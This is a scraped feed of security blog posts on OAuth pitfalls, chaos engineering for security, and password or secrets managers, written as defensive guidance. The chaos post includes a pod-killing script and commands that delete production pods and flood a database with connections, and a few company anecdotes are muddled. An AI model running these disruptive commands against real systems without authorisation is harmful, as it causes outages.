Testing:\nDon\u0026rsquo;t trust your implementation without testing it.\nThings worth testing (because they fail in real systems):\nRedirect URI mismatch: does it reject anything that\u0026rsquo;s not an exact match? Missing/invalid state: does the callback fail hard? PKCE: can you complete the flow without a valid code_verifier? Token storage: can any XSS grab a token (localStorage) or is it HttpOnly server-side? Refresh token reuse: does the IdP revoke the session when reuse happens? ID token validation: does your app reject wrong iss, wrong aud, expired tokens, and nonce mismatch? Tooling:\nBurp Suite to mess with redirects and parameters A browser with devtools to confirm where tokens end up Your IdP logs (sign-in logs and token issuance logs) Try to break it yourself before attackers do.\nThe Boring Truth OAuth 2.0 security isn\u0026rsquo;t about exotic attacks or sophisticated defenses. It\u0026rsquo;s about getting the basics right.\nMost OAuth breaches happen because:\nRedirect URIs weren\u0026rsquo;t validated properly PKCE wasn\u0026rsquo;t implemented State parameter was missing Tokens were stored in localStorage Scopes were overly permissive Fix those five things and you\u0026rsquo;re ahead of most implementations.\nThe OAuth spec gives you options. Most options are traps. The path to secure OAuth is knowing which options to avoid and which to always use.\nPKCE: Always. State parameter: Always. Exact redirect URI matching: Always. Server-side token storage: Always. Minimal scopes: Always.\nEverything else is details.\n","date":"20 May 2025","permalink":"https://gazsecops.github.io/posts/oauth2-security-pitfalls/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e We need OAuth for the new API.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Have you implemented PKCE?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e What\u0026rsquo;s PKCE?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Proof Key for Code Exchange. Prevents authorisation code interception.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e Is that the state parameter thing?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e No, that\u0026rsquo;s CSRF protection. Different problem.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e \u0026hellip;we might need to start over.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eThis conversation happens constantly. OAuth 2.0 is everywhere, but most implementations get it wrong. Not spectacularly wrong. Just wrong enough to be exploitable.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"OAuth 2.0 isn't hard because the spec is complex. It's hard because the spec gives you enough rope to hang yourself, and most people do exactly that.\"\n\u003c/aside\u003e\n\u003cp\u003eThe OAuth 2.0 specification is a framework, not a protocol. It gives you options. Most of those options are wrong for your use case. The security comes from knowing which options to pick and which to avoid.\u003c/p\u003e","tags":["security","oauth2","authentication","web-security"],"title":"OAuth 2.0 Security: What Actually Breaks"},{"content":" CISO: Our security team is world-class. Firewalls, IDS, EDR, SIEM. We\u0026rsquo;re covered.\nSRE: What happens if a switch fails? Or database goes down? Or network partitions?\nCISO: That\u0026rsquo;s ops problem. Security is about preventing attacks.\nSRE: Security without resilience is useless. If everything breaks under pressure, attacker wins. If you survive chaos, attacker doesn\u0026rsquo;t matter.\n\"The best security test isn't a penetration test. It's Game Day when everything tries to break at once and you see what holds together.\" Traditional security is defensive. Firewalls, EDR, access controls. Prevent attacks, detect intruders, respond to incidents. But there\u0026rsquo;s a problem: you only know your defenses work when someone attacks. And you only find weaknesses when they\u0026rsquo;re exploited.\nChaos engineering is offensive. You break things on purpose. Systematically. Repeatedly. Not to cause problems, but to discover them. To find where your resilience fails before attackers exploit those failures.\nWhat Chaos Engineering Actually Is Chaos engineering is controlled failure injection. You deliberately break things to see what happens.\nThe principles:\nBlast radius is small - Start with isolated failures, expand gradually Minimal surprise - Learn what breaks before production, not during State isolation - Don\u0026rsquo;t cascade failures across systems Roll back fast - If chaos goes wrong, revert immediately Culture of resilience - Everyone expects failures, not just uptime From security perspective:\nTraditional security: \u0026ldquo;We think attacker might try this path, so we block it.\u0026rdquo; Chaos engineering: \u0026ldquo;We\u0026rsquo;re going to break this path and see if the system survives.\u0026rdquo;\nDifference: One is theory about attacks. The other is empirical testing of reality.\nReal-World Examples Netflix: Game Day Once per year, Netflix shuts down entire Chaos Monkey for a full day. Random failures everywhere.\nWhat they inject:\nRandom AZ failures in AWS Latency spikes in database connections Random dependency failures Random service instance terminations Result:\nEngineers frantically fix issues that surface System hardens every year Chaos becomes part of culture Game Day becomes easier each time Security lesson: Attackers don\u0026rsquo;t attack one thing. They attack everything. Game Day tests what happens when multiple vectors hit simultaneously. You find single points of failure that cascade.\nShopify: Chaos Monkey Shopify runs Chaos Monkey continuously. Every day, random failures across their platform.\nWhat they test:\nRandom pod terminations in Kubernetes Random network latency Random database query timeouts Random third-party API failures Result:\nShopify hardened to random failures Built resilience into platform architecture Learned that some \u0026ldquo;important\u0026rdquo; systems weren\u0026rsquo;t actually critical Identified single points of failure Security lesson: You don\u0026rsquo;t know what\u0026rsquo;s critical until it fails. Shopify discovered that some systems they thought were important weren\u0026rsquo;t. Resources moved to actually critical things. Attackers waste time on unimportant targets when you\u0026rsquo;ve hardened important ones.\nAirbnb: Gremlin Airbnb uses Gremlin (chaos-as-a-service) to inject failures across their infrastructure.\nWhat they inject:\nRandom CPU spikes on hosts Random network packet loss Random memory exhaustion Random DNS failures Result:\nReal-time resilience testing Found weaknesses in monitoring (alerts don\u0026rsquo;t fire, incidents missed) Improved incident response (faster reaction to real issues) Built confidence in system resilience Security lesson: Monitoring is your eyes. Chaos engineering tests if they\u0026rsquo;re actually looking. If failure happens and you don\u0026rsquo;t notice, attacker can exploit quietly. Chaos engineering finds blind spots in visibility.\nChaos Engineering for Security 1. Resilience Testing Test if security controls survive failure.\nExample scenario:\nNormal state: User → MFA → Auth service → Database → Access Chaos: Auth service fails User → MFA → Auth service [DOWN] → ? → Access What happens? - Do users get access anyway? (bad - fallback bypasses security) - Do they get useful error messages? (bad - information leakage) - Does system recover cleanly? (good - resilient) Attackers exploit fallbacks. If auth service fails and system gracefully degrades to \u0026ldquo;no auth required for local access,\u0026rdquo; attackers find and exploit. Chaos engineering reveals these security trade-offs.\n2. Attack Surface Discovery Chaos reveals hidden attack vectors.\nExample:\nInject network partition between API and database Observe: API caches credentials and continues working Security issue: Credentials cached in memory after auth revocation Traditional security testing might miss this. Chaos engineering (random partitions) reveals it naturally.\n3. Incident Response Testing Chaos is practice for real incidents.\nExample:\nInject random service failure Measure: - Time to detection (alerts fire?) - Time to identification (team knows what\u0026#39;s wrong?) - Time to containment (can they isolate problem?) - Time to resolution (how fast can they fix?) This tests your incident response process under realistic pressure. Not theoretical tabletop exercises - actual failing systems.\n4. Defense Testing in Depth Test if security controls work under stress.\nExample:\nNormal: Rate limiter blocks 100 req/sec Chaos: Inject 1000 req/sec traffic spike Observation: - Rate limiter holds? (good) - System degrades gracefully? (good) - Rate limiter crashes? (bad - DoS vulnerability) - Backend bypassed? (bad - rate limiter is cosmetic) Attackers flood systems. Chaos engineering tests if your defenses hold under realistic attack patterns.\nImplementing Chaos Engineering Tool 1: Chaos Monkey # Basic Chaos Monkey implementation (Kubernetes) # # This is intentionally boring: pick a target by label and kill one pod. # If your system falls over from that, you don\u0026#39;t need a chaos platform. # # Requirements: # - kubectl configured for the cluster # - RBAC that only allows what you intend (namespace-scoped) import random import time import subprocess import json class ChaosMonkey: def __init__(self, namespace, services, dry_run=True): self.namespace = namespace self.services = services self.dry_run = dry_run self.is_running = False def start(self): self.is_running = True while self.is_running: self.attack_random_service() time.sleep(random.randint(60, 600)) # 1-10 minutes def stop(self): self.is_running = False def attack_random_service(self): service = random.choice(self.services) attack_type = random.choice([\u0026#39;terminate\u0026#39;, \u0026#39;latency\u0026#39;, \u0026#39;packet_loss\u0026#39;]) if attack_type == \u0026#39;terminate\u0026#39;: self.terminate_service(service) elif attack_type == \u0026#39;latency\u0026#39;: self.inject_latency(service) elif attack_type == \u0026#39;packet_loss\u0026#39;: self.inject_packet_loss(service) print(f\u0026#34;[ChaosMonkey] {attack_type} on {service}\u0026#34;) def terminate_service(self, service): # Kill one pod matching label app=\u0026lt;service\u0026gt; pod = self._pick_pod(label_selector=f\u0026#34;app={service}\u0026#34;) if not pod: print(f\u0026#34;[ChaosMonkey] no pod found for app={service}\u0026#34;) return cmd = [ \u0026#34;kubectl\u0026#34;, \u0026#34;delete\u0026#34;, \u0026#34;pod\u0026#34;, \u0026#34;-n\u0026#34;, self.namespace, pod, \u0026#34;--wait=false\u0026#34;, ] if self.dry_run: print(f\u0026#34;[ChaosMonkey] DRY RUN: {\u0026#39; \u0026#39;.join(cmd)}\u0026#34;) return subprocess.run(cmd, check=True) def inject_latency(self, service): # Prefer a Kubernetes-native chaos tool for network faults. # This example assumes Chaos Mesh is installed. self._apply_chaos_mesh_network(service=service, mode=\u0026#34;delay\u0026#34;, latency_ms=250) def inject_packet_loss(self, service): # This example assumes Chaos Mesh is installed. self._apply_chaos_mesh_network(service=service, mode=\u0026#34;loss\u0026#34;, loss_percent=10) def _pick_pod(self, label_selector): cmd = [ \u0026#34;kubectl\u0026#34;, \u0026#34;get\u0026#34;, \u0026#34;pods\u0026#34;, \u0026#34;-n\u0026#34;, self.namespace, \u0026#34;-l\u0026#34;, label_selector, \u0026#34;-o\u0026#34;, \u0026#34;json\u0026#34;, ] out = subprocess.check_output(cmd) data = json.loads(out.decode(\u0026#34;utf-8\u0026#34;)) items = [i for i in data.get(\u0026#34;items\u0026#34;, []) if i.get(\u0026#34;status\u0026#34;, {}).get(\u0026#34;phase\u0026#34;) == \u0026#34;Running\u0026#34;] if not items: return None return random.choice(items)[\u0026#34;metadata\u0026#34;][\u0026#34;name\u0026#34;] def _apply_chaos_mesh_network(self, service, mode, latency_ms=None, loss_percent=None): name = f\u0026#34;{service}-{mode}-{int(time.time())}\u0026#34; if mode == \u0026#34;delay\u0026#34;: action = \u0026#34;delay\u0026#34; tc = f\u0026#34;latency: \u0026#39;{latency_ms}ms\u0026#39;\u0026#34; elif mode == \u0026#34;loss\u0026#34;: action = \u0026#34;loss\u0026#34; tc = f\u0026#34;loss: \u0026#39;{loss_percent}\u0026#39;\u0026#34; else: raise ValueError(\u0026#34;unknown mode\u0026#34;) manifest = f\u0026#34;\u0026#34;\u0026#34;apiVersion: chaos-mesh.org/v1alpha1 kind: NetworkChaos metadata: name: {name} namespace: {self.namespace} spec: action: {action} mode: one selector: labelSelectors: app: {service} duration: \u0026#39;60s\u0026#39; tc: {tc} \u0026#34;\u0026#34;\u0026#34; cmd = [\u0026#34;kubectl\u0026#34;, \u0026#34;apply\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;-\u0026#34;] if self.dry_run: print(\u0026#34;[ChaosMonkey] DRY RUN: kubectl apply -f -\u0026#34;) print(manifest) return subprocess.run(cmd, input=manifest.encode(\u0026#34;utf-8\u0026#34;), check=True) # Define services to attack (assumes app=\u0026lt;name\u0026gt; labels) services = [ \u0026#39;auth-service\u0026#39;, \u0026#39;database-primary\u0026#39;, \u0026#39;api-gateway\u0026#39;, \u0026#39;payment-service\u0026#39;, \u0026#39;user-service\u0026#39; ] # Start Chaos Monkey chaos = ChaosMonkey(namespace=\u0026#34;production\u0026#34;, services=services, dry_run=True) chaos.start() # In production, this runs in controlled environment # with proper rollback and monitoring Key features:\nRandom service selection Random attack type Random timing (simulates unpredictable attackers) Can start/stop cleanly Tool 2: Gremlin (Chaos-as-a-Service) Gremlin provides ready-to-use chaos attacks:\nTypes:\nResource attacks: CPU, memory, disk, file descriptor exhaustion Network attacks: Latency, packet loss, DNS failure State attacks: Process kill, service restart, shutdown Infrastructure attacks: Zone failure, region failure Example using Gremlin:\n# Install Gremlin CLI brew install gremlin # macOS # or download from https://www.gremlin.com/get # Create experiment gremlin attack cpu \\ --app my-application \\ --container auth-service \\ --cpu-percent 80 \\ --length 60s # Result: auth-service CPU spikes to 80% for 60 seconds # Watch how your system responds Why use service vs build:\nFaster to implement (no tooling development) Better attack diversity (they\u0026rsquo;ve built many) Integration with monitoring (Prometheus, Datadog, etc.) Professional support Tool 3: Kubernetes Chaos Kubernetes-native chaos testing with Chaos Mesh or LitmusChaos.\nExample with Chaos Mesh:\napiVersion: chaos-mesh.org/v1alpha1 kind: PodChaos metadata: name: auth-service-chaos namespace: production spec: selector: matchLabels: app: auth-service mode: one action: pod-kill scheduler: cron: \u0026#34;@every 5m\u0026#34; What this does:\nEvery 5 minutes, kill one auth-service pod Kubernetes automatically restarts it System must handle graceful restart Security question: Does auth service restart bypass any security controls? Chaos Engineering Scenarios Scenario 1: Zero Trust Network Failure Inject network partition between microservices.\nKubernetes example: deny traffic from user-service to auth-service.\napiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: deny-user-to-auth namespace: production spec: podSelector: matchLabels: app: auth-service policyTypes: - Ingress ingress: - from: - podSelector: matchLabels: app: auth-service Apply it:\nkubectl apply -f deny-user-to-auth.yaml Observation checklist:\nCan user-service still function without auth? (bad) Are sessions cached and still valid after revocation? (bad) Does the system fail closed or fail open? (open is bad) What error messages do users see? (don\u0026rsquo;t leak internals) Security lesson: Network segmentation is control, not just protection. Attackers can partition networks. You need to test what happens when they do.\nScenario 2: Database Connection Pool Exhaustion Simulate connection flood (DoS-like, but from chaos perspective).\nIf you use Postgres, pgbench is a decent blunt instrument.\n# From a pod that can reach the DB kubectl run -n production -it --rm pgbench --image=postgres:16 -- bash pgbench -h db.internal -U app_user -c 200 -T 60 -P 5 payments If you\u0026rsquo;re on MySQL/MariaDB, mysqlslap does the same job:\nmysqlslap --host=db.internal --user=app_user --password \\ --concurrency=200 --iterations=1 --number-of-queries=20000 Observation checklist:\nDoes the application handle exhaustion gracefully (timeouts, backoff)? Does it crash and restart-loop? Do you melt the database for everyone else? Do error messages leak schema/usernames/hostnames? Security lesson: Connection pools are configuration, not just performance. Wrong settings create security vulnerabilities.\nScenario 3: Cascading Failure Test Trigger small failure, watch cascade.\nKubernetes example: kill one pod in each tier, 60 seconds apart.\nkubectl delete pod -n production -l app=dependency-a --wait=false sleep 60 kubectl delete pod -n production -l app=service-b --wait=false sleep 60 kubectl delete pod -n production -l app=service-c --wait=false Observation:\nDoes a single failure cascade across the platform? Where does it stop (blast radius)? Can the system recover without manual intervention? What security controls get bypassed when dependencies are down? Security lesson: Attackers trigger cascades. Single vulnerability can compromise entire platform. Chaos engineering finds these cascade paths.\nBuilding Chaos Culture Leadership Buy-In Leadership must support chaos engineering. Without it:\nEngineers won\u0026rsquo;t break production (fear of blame) Learning from failures won\u0026rsquo;t happen (blame culture) Resilience won\u0026rsquo;t improve (no incentive to invest) Executive message: \u0026ldquo;We\u0026rsquo;re going to break things on purpose. Not to cause problems, but to find them. Every failure is a learning opportunity, not a mistake.\u0026rdquo;\nSafety First Chaos engineering requires guardrails:\nPre-chaos checklist:\nIs this blast radius small enough? Can we roll back quickly? Are stakeholders informed? Do we have rollback plan? During chaos:\nMonitor everything Have rollback ready Don\u0026rsquo;t escalate to critical systems without approval Stop if unexpected problems occur Post-chaos:\nDocument everything Share learnings Improve system based on results Update runbooks Measurement If you don\u0026rsquo;t measure, you don\u0026rsquo;t improve:\nMetrics to track:\nMTTR (Mean Time To Resolve incidents) MTBF (Mean Time Between Failures) System availability during chaos Alert response time Rollback success rate Blameless postmortem completion rate Example dashboard:\nChaos Engineering Metrics ======================== MTTR (chaos incidents): 12 minutes MTBF (production): 45 days Availability during chaos: 99.9% Alert response time: 3 minutes Rollback success rate: 95% Postmortem completion: 100% Recent Chaos Runs: - 2025-05-12: Database connection pool exhaustion Result: System degraded gracefully, no outage Action: Adjusted pool settings - 2025-05-10: Auth service latency injection Result: Timeouts increased, users experienced delays Action: Optimized database queries - 2025-05-08: Network partition between services Result: Cascading failure across platform Action: Implemented circuit breakers Common Mistakes Mistake 1: Chaos Without Purpose Breaking things randomly without learning.\nProblem:\nEngineers get desensitized to failures No focused improvement Chaos becomes noise, not signal Better:\nStart with hypothesis: \u0026ldquo;We suspect X might be weak\u0026rdquo; Design chaos to test that hypothesis Measure, learn, improve Mistake 2: Too Much, Too Soon Starting with massive chaos before readiness.\nProblem:\nFailures cascade beyond expectation Recovery takes hours/days Business impact too high Chaos engineering loses support Better:\nStart small (single service, isolated failure) Gradually increase complexity Build confidence and tooling first Measure blast radius before expanding Mistake 3: No Rollback Plan Chaos goes wrong, no way back.\nProblem:\nSmall failure becomes major outage Recovery takes manual intervention Business impact high Chaos engineering blamed for outage Better:\nAlways have rollback ready before chaos Test rollback regularly (not just during chaos) Know exactly how to revert Have rollback automation Mistake 4: Ignoring Security Impact Focusing only on availability, not security.\nProblem:\nChaos reveals security vulnerabilities Teams ignore them (that\u0026rsquo;s security\u0026rsquo;s job) Attackers exploit later Chaos engineering opportunity wasted Better:\nInclude security in chaos hypotheses Test security controls under stress Document security findings Involve security team in chaos planning Getting Started Phase 1: Learn (Week 1-2) Read about it\nNetflix\u0026rsquo;s Chaos Monkey documentation Gremlin\u0026rsquo;s blog and guides Shopify\u0026rsquo;s chaos engineering talks Run toy experiments\nLocal dev environment Simple failures (kill process, add latency) Learn what tools can do Build buy-in\nPresent to team with examples Explain benefits (resilience, not chaos) Address fears (we\u0026rsquo;ll be careful, we have rollback) Phase 2: Sandbox (Week 3-4) Choose staging environment\nNot production, but realistic Has monitoring and alerting Can be rebuilt from scratch Implement chaos tooling\nChaos Monkey or Gremlin Simple experiments initially Document everything Run first experiments\nSmall blast radius Hypothesis-driven (test specific thing) Measure results Share learnings Phase 3: Production Cautious (Week 5-8) Get explicit approval\nLeadership understands what\u0026rsquo;s happening Business impact understood Rollback plan approved Start with low-risk experiments\nRead-only services Non-critical functionality Off-peak hours initially Expand gradually\nIncrease complexity as confidence grows Move to more critical systems Increase blast radius Continuous learning\nRegular postmortems Improve system based on findings Share learnings across teams Phase 4: Embedded (Week 9+) Make chaos part of development\nInclude chaos tests in CI/CD Test resilience with every deployment Make resilience a first-class concern Automate chaos\nScheduled experiments Automated rollback if things go wrong Integration with monitoring Culture of resilience\nEngineers expect failures Blameless postmortems Continuous improvement Chaos becomes normal, not exceptional The Honest Truth Chaos engineering isn\u0026rsquo;t about being reckless. It\u0026rsquo;s about being deliberate.\nYou\u0026rsquo;re going to have failures either way.\nWithout chaos: Random failures, unexpected timing, no preparation, panic response With chaos: Controlled failures, expected timing, preparation, practiced response Chaos engineering trades predictable practice for unpredictable reality.\nFrom security perspective:\nTraditional security assumes defenses work Chaos engineering proves they actually work Attackers don\u0026rsquo;t announce themselves But chaos engineering announces failure, shows you how you respond Chaos engineering turns security from theory to practice.\nInstead of saying \u0026ldquo;our rate limiter should stop DoS,\u0026rdquo; chaos engineering floods the system and you watch.\nInstead of saying \u0026ldquo;our MFA should block unauthorized access,\u0026rdquo; chaos engineering disables auth service and you see if fallbacks are secure.\nInstead of saying \u0026ldquo;our monitoring detects attacks,\u0026rdquo; chaos engineering breaks things and you see if alerts fire.\nChaos engineering is stress-testing your security controls. Finding where they fail before attackers do.\nLessons from Netflix Game Day, Shopify Chaos Monkey, Airbnb\u0026rsquo;s resilience testing, and implementing chaos engineering across platforms ranging from startups to enterprise-scale infrastructure. Chaos isn\u0026rsquo;t the point. Resilience is. Breaking things just gets you there faster.\n","date":"15 May 2025","permalink":"https://gazsecops.github.io/posts/chaos-engineering-security-tool/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-ciso\"\u003eCISO:\u003c/span\u003e Our security team is world-class. Firewalls, IDS, EDR, SIEM. We\u0026rsquo;re covered.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sre\"\u003eSRE:\u003c/span\u003e What happens if a switch fails? Or database goes down? Or network partitions?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-ciso\"\u003eCISO:\u003c/span\u003e That\u0026rsquo;s ops problem. Security is about preventing attacks.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sre\"\u003eSRE:\u003c/span\u003e Security without resilience is useless. If everything breaks under pressure, attacker wins. If you survive chaos, attacker doesn\u0026rsquo;t matter.\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\n\"The best security test isn't a penetration test. It's Game Day when everything tries to break at once and you see what holds together.\"\n\u003c/aside\u003e\n\u003cp\u003eTraditional security is defensive. Firewalls, EDR, access controls. Prevent attacks, detect intruders, respond to incidents. But there\u0026rsquo;s a problem: you only know your defenses work when someone attacks. And you only find weaknesses when they\u0026rsquo;re exploited.\u003c/p\u003e\n\u003cp\u003eChaos engineering is offensive. You break things on purpose. Systematically. Repeatedly. Not to cause problems, but to discover them. To find where your resilience fails before attackers exploit those failures.\u003c/p\u003e","tags":["security","chaos-engineering","resilience","incident-response"],"title":"Chaos Engineering as Security Tool: Breaking Things to Make Them Stronger"},{"content":" Management: \u0026ldquo;We need a password manager for a team.\u0026rdquo;\nSysadmin: \u0026ldquo;Which one?\u0026rdquo;\nManagement: \u0026ldquo;The secure one.\u0026rdquo;\nSysadmin: \u0026ldquo;They\u0026rsquo;re all secure. What do you actually need it to do?\u0026rdquo;\nManagement: \u0026ldquo;\u0026hellip;store passwords?\u0026rdquo;\nThis conversation happens constantly. Organizations pick password managers the same way they pick any security tool - based on vendor pitch decks and analyst reports, not actual requirements.\n\"Password managers solve different problems. KeePassXC for personal use, Bitwarden for teams, Vault for infrastructure. Pick based on what you're protecting and who needs access, not which one has the best marketing.\" The password manager landscape in 2025 splits into three categories: personal password managers, team password managers, and infrastructure secrets management. They\u0026rsquo;re not interchangeable.\nPersonal Password Managers For individual use. Your email passwords, banking logins, personal accounts.\nKeePassXC Local database. No cloud. You control the file.\nWhat it does well:\nZero trust in cloud providers (database stays on your machines) Works completely offline Free and open source Linux-native (actually works properly, not an afterthought) What it doesn\u0026rsquo;t do:\nNo built-in sync (use Syncthing or Nextcloud yourself) No browser autofill by default (requires setup) No mobile apps from the same developers (third-party only) When to use it:\nYou don\u0026rsquo;t trust cloud providers You know how to sync files yourself You want complete control I use KeePassXC. Database syncs via Syncthing across three machines. When Syncthing breaks (it does), I fix it. When a cloud password manager has an outage, my passwords still work.\nBitwarden Cloud-based. Can self-host. Open source.\nWhat it does well:\nWorks everywhere (browser extensions, mobile apps, desktop) Free tier is actually usable Can self-host with Vaultwarden (lighter, faster) Import from basically anything What it doesn\u0026rsquo;t do:\nCloud version requires trusting Bitwarden servers Self-hosted requires maintaining a server Mobile autofill is hit-or-miss on Linux phones When to use it:\nYou want cloud sync that just works You\u0026rsquo;re willing to trust Bitwarden (or run your own) You need it to work on your mum\u0026rsquo;s phone without tech support calls Most people should use Bitwarden. It\u0026rsquo;s the right balance of security, usability, and \u0026ldquo;just works.\u0026rdquo;\nbitwarden.com\n1Password Proprietary. Expensive. Polished.\nWhat it does well:\nBest UX in industry (genuinely smooth) SSH key agent integration (store SSH keys, use them transparently) Family/team features that don\u0026rsquo;t require a PhD Secret Key protection (additional encryption layer) What it doesn\u0026rsquo;t do:\nWork without paying (no meaningful free tier) Give you source code access Let you self-host 1password.com\nWhen to use it:\nYou\u0026rsquo;re paying anyway (company expense) UX matters more than open source You use SSH keys heavily If your company pays for it, 1Password is excellent. If you\u0026rsquo;re paying yourself, Bitwarden is 90% as good for free.\nTeam Password Managers For teams sharing credentials. Support login credentials, API keys, shared accounts.\nBitwarden Organizations Same Bitwarden, team features enabled.\nWhat works:\nCollections (group passwords by project/team) Granular permissions (who can see what) Audit logs (who accessed what when) Works like personal Bitwarden (minimal training) What doesn\u0026rsquo;t:\nGets expensive for large teams Permissions model is basic (not fine-grained RBAC) No approval workflows Real usage:\nEngineer: I need the staging database password.\nSysadmin: Check Bitwarden, Engineering collection.\nEngineer: I don\u0026rsquo;t have access.\nSysadmin: Fixed. Added you to the collection.\nThis workflow is fine for teams under 50 people. Beyond that, you need something with proper access control.\nPassbolt Built for teams. Open source. Self-hosted.\nWhat works:\nGranular permissions (user groups, resource permissions) Audit logs and compliance features API for automation GPG-based encryption (can use hardware keys) What doesn\u0026rsquo;t:\nRequires setup and maintenance Browser extension can be flaky Steeper learning curve than Bitwarden passbolt.com\nWhen to use it:\nYou need detailed access controls Compliance requires self-hosted You have someone to maintain it Financial services and government contractors use Passbolt. If you need to prove who accessed what and when, Passbolt has the audit trail.\nInfrastructure Secrets Management For machines, not humans. Database passwords, API keys, TLS certificates, cloud credentials.\nHashiCorp Vault Industry standard. Does everything. Complex.\nWhat it does:\nDynamic secrets (generate database credentials on demand) Encryption as a service PKI (issue and manage certificates) AWS/GCP/Azure integration Kubernetes secrets injection What it costs:\nSetup complexity (not trivial to run properly) Operational overhead (Vault clusters need care and feeding) License changes (newer versions have restrictive licenses) When to use it:\nYou have infrastructure at scale You need dynamic credentials You have someone who knows how to run it vaultproject.io\nExample use case: Your application needs a database password. Instead of hardcoding it, the app authenticates to Vault using its Kubernetes service account. Vault generates a PostgreSQL user with a 1-hour TTL and returns the credentials. App uses them. After 1 hour, credentials expire and become useless.\nThis is brilliant for limiting blast radius. It\u0026rsquo;s also complicated to set up.\nA minimal Vault workflow (KV secrets):\nWrite a secret:\nvault secrets enable -path=kv kv-v2 vault kv put kv/apps/payments DB_PASSWORD=\u0026#39;replace-me\u0026#39; Read it back:\nvault kv get kv/apps/payments Lock it down with a policy:\n# payments.hcl path \u0026#34;kv/data/apps/payments\u0026#34; { capabilities = [\u0026#34;read\u0026#34;] } vault policy write payments payments.hcl Dynamic database credentials (the bit people actually want):\nThis creates short-lived users instead of storing a shared password forever.\nvault secrets enable database vault write database/config/payments \\ plugin_name=postgresql-database-plugin \\ allowed_roles=payments-ro \\ connection_url=\u0026#39;postgresql://{{username}}:{{password}}@db.internal:5432/payments?sslmode=require\u0026#39; \\ username=\u0026#39;vault_admin\u0026#39; \\ password=\u0026#39;vault_admin_password\u0026#39; vault write database/roles/payments-ro \\ db_name=payments \\ creation_statements=\u0026#34;CREATE ROLE \\\u0026#34;{{name}}\\\u0026#34; WITH LOGIN PASSWORD \u0026#39;{{password}}\u0026#39; VALID UNTIL \u0026#39;{{expiration}}\u0026#39;; GRANT SELECT ON ALL TABLES IN SCHEMA public TO \\\u0026#34;{{name}}\\\u0026#34;;\u0026#34; \\ default_ttl=1h \\ max_ttl=24h vault read database/creds/payments-ro The operational lesson: if you can\u0026rsquo;t rotate the underlying database admin credential safely, don\u0026rsquo;t start here. You\u0026rsquo;ll build a new dependency and then spend a year being scared of it.\nOpenBao Community fork of Vault. Same features, different governance.\nWhy it exists:\nHashiCorp changed Vault\u0026rsquo;s license in 2023. Open source community forked it. OpenBao is that fork.\nWhat\u0026rsquo;s different:\nFully open source license (MPL 2.0) Community governance Feature parity with Vault OSS What\u0026rsquo;s same:\nAPI compatibility (drop-in replacement) Configuration format Client tools openbao.org\nWhen to use it:\nYou want Vault features without license concerns You prefer community governance You\u0026rsquo;re already using Vault and want to avoid license issues If you\u0026rsquo;re starting fresh and want Vault-like features, OpenBao is the safer bet long-term.\nIn practice:\nVault CLI is vault OpenBao CLI is bao Most examples port over directly.\nCloud Provider Secrets Managers AWS Secrets Manager, Azure Key Vault, Google Secret Manager\nAdvantages:\nIntegrated with cloud IAM (permissions work like everything else) No servers to maintain Disadvantages:\nVendor lock-in (hard to migrate away) Less powerful than Vault (no dynamic secrets, limited PKI) Costs add up at scale When to use:\nYou\u0026rsquo;re all-in on one cloud provider You need something simple that works You don\u0026rsquo;t want to run Vault Most startups should start here. If you\u0026rsquo;re on AWS anyway, Secrets Manager is fine. When you outgrow it, migrate to Vault/OpenBao.\nUseful commands (so you can stop clicking around portals):\nAWS Secrets Manager:\naws secretsmanager create-secret \\ --name payments/db_password \\ --secret-string \u0026#39;replace-me\u0026#39; aws secretsmanager get-secret-value \\ --secret-id payments/db_password \\ --query SecretString \\ --output text Azure Key Vault:\naz keyvault secret set \\ --vault-name kv-prod \\ --name payments-db-password \\ --value \u0026#39;replace-me\u0026#39; az keyvault secret show \\ --vault-name kv-prod \\ --name payments-db-password \\ --query value \\ -o tsv Google Secret Manager:\nprintf \u0026#39;%s\u0026#39; \u0026#39;replace-me\u0026#39; | gcloud secrets create payments-db-password --data-file=- gcloud secrets versions access latest --secret=payments-db-password Hardware-Backed Security For when software encryption isn\u0026rsquo;t enough.\nTPM (Trusted Platform Module) Built into most modern hardware. Stores encryption keys in hardware.\nWhat it\u0026rsquo;s used for:\nLUKS disk encryption on Linux Measured boot (verify system hasn\u0026rsquo;t been tampered with) Storing credentials safely Limitations:\nTied to specific hardware Not portable across machines Complex to work with directly You\u0026rsquo;re probably already using TPM without knowing it. If you enabled full disk encryption on a modern laptop, TPM is storing the key.\nYubiHSM / Nitrokey HSM Small, affordable hardware security modules.\nUse cases:\nCode signing keys (sign releases without key leaving HSM) Certificate authority (CA private key never on disk) Air-gapped environments Example setup:\nCertificate authority private key lives on YubiHSM. When you need to sign a certificate, you authenticate to the HSM. HSM performs signing operation. Private key never leaves hardware.\nIf someone compromises the server, they get nothing - they can\u0026rsquo;t extract the key.\nIf you\u0026rsquo;re going down this road, you\u0026rsquo;ll be living with PKCS#11.\nBasic sanity checks (generic PKCS#11):\n# List slots and tokens pkcs11-tool --module /path/to/your/pkcs11.so --list-slots # List objects on a token pkcs11-tool --module /path/to/your/pkcs11.so --login --list-objects Then you configure your CA / signing tooling to use the PKCS#11 key handle instead of a key file on disk.\nReality check: the HSM isn\u0026rsquo;t the hard part. The hard part is provisioning, 